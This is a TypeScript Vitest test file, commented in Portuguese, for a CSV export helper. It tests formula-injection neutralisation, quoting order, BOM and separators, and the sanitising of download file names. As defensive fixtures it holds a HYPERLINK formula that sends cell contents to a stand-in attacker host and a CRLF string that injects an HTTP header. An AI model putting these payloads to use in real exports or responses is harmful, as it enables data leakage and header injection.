/**
 * A planilha que sai daqui é levada para reunião e tratada como prova.
 *
 * ⚠️ Dois modos de falha, e os dois são silenciosos:
 *   1. célula que vira FÓRMULA ao abrir o arquivo — o conteúdo vem de fonte
 *      externa, e razão social com `=` existe;
 *   2. dado ALTERADO na neutralização — planilha que muda o que o dado diz é
 *      pior que fórmula ativa, porque a fórmula pelo menos aparece.
 */
import { describe, expect, it } from "vitest";
import { celulaCsv, montaCsv, neutralizaCelula, nomeDeArquivoSeguro } from "@/lib/exportacao/csv";

describe("neutralizaCelula", () => {
  it("neutraliza os quatro caracteres que viram fórmula", () => {
    for (const c of ["=", "+", "-", "@"]) {
      expect(neutralizaCelula(`${c}SOMA(A1:A9)`)).toBe(`'${c}SOMA(A1:A9)`);
    }
  });

  it("neutraliza o ataque real de vazamento por HYPERLINK", () => {
    const ataque = '=HYPERLINK("http://malicioso.example/?"&A1,"clique aqui")';
    expect(neutralizaCelula(ataque).startsWith("'=")).toBe(true);
  });

  it("pega o caractere perigoso escondido atrás de tabulação ou quebra de linha", () => {
    // O Excel ignora o espaço em branco inicial e ainda interpreta a fórmula.
    expect(neutralizaCelula("\t=1+1")).toBe("'\t=1+1");
    expect(neutralizaCelula("\r\n@SUM(1)")).toBe("'\r\n@SUM(1)");
  });

  it("NÃO altera o conteúdo de texto comum", () => {
    for (const t of ["PETROLEO BRASILEIRO S.A.", "58.182.400/0001-45", "Camaçari/BA", ""]) {
      expect(neutralizaCelula(t)).toBe(t);
    }
  });

  it("não come o dado: o texto original continua inteiro depois do apóstrofo", () => {
    // ⚠️ Este é o teste que impede a "correção" fácil de apagar o caractere.
    const original = "-EMPRESA TRACO NA FRENTE LTDA";
    const saida = neutralizaCelula(original);
    expect(saida.slice(1)).toBe(original);
  });
});

describe("celulaCsv", () => {
  it("envolve em aspas quando há separador, aspas ou quebra de linha", () => {
    expect(celulaCsv("A;B")).toBe('"A;B"');
    expect(celulaCsv('diz "oi"')).toBe('"diz ""oi"""');
    expect(celulaCsv("linha1\nlinha2")).toBe('"linha1\nlinha2"');
  });

  it("neutraliza ANTES de envolver em aspas", () => {
    // ⚠️ Na ordem inversa o apóstrofo cairia dentro das aspas de escape e a
    // fórmula continuaria ativa quando a planilha abrisse.
    expect(celulaCsv("=A1;B2")).toBe(`"'=A1;B2"`);
  });

  it("vazio e nulo viram célula vazia, não a palavra 'null'", () => {
    expect(celulaCsv(null)).toBe("");
    expect(celulaCsv(undefined)).toBe("");
  });
});

describe("montaCsv", () => {
  const linhas = [
    { nome: "ACME LTDA", cnpj: "11222333" },
    { nome: "=EVIL()", cnpj: "44555666" },
  ];
  const colunas = [
    { cabecalho: "empresa", valor: (l: (typeof linhas)[number]) => l.nome },
    { cabecalho: "cnpj", valor: (l: (typeof linhas)[number]) => l.cnpj },
  ];

  it("começa com BOM, para o Excel não estragar o acento", () => {
    expect(montaCsv(linhas, colunas).charCodeAt(0)).toBe(0xfeff);
  });

  it("usa ponto e vírgula, que é o que o Excel em português espera", () => {
    expect(montaCsv(linhas, colunas)).toContain("empresa;cnpj");
  });

  it("neutraliza no corpo, não só no cabeçalho", () => {
    expect(montaCsv(linhas, colunas)).toContain("'=EVIL()");
  });

  it("uma linha por registro, mais o cabeçalho", () => {
    const linhasDoArquivo = montaCsv(linhas, colunas).trim().split("\r\n");
    expect(linhasDoArquivo).toHaveLength(3);
  });
});

describe("nomeDeArquivoSeguro", () => {
  it("não deixa passar aspas nem quebra de linha, que injetariam cabeçalho HTTP", () => {
    const sujo = 'rede "ACME"\r\nX-Coisa: injetada';
    const limpo = nomeDeArquivoSeguro(sujo);
    expect(limpo).not.toMatch(/["\r\n]/);
  });

  it("tira acento e mantém legível", () => {
    expect(nomeDeArquivoSeguro("rede-Camaçari-2026")).toBe("rede-Camacari-2026");
  });

  it("nunca devolve vazio", () => {
    expect(nomeDeArquivoSeguro("///")).toBe("exportacao");
    expect(nomeDeArquivoSeguro("")).toBe("exportacao");
  });
});
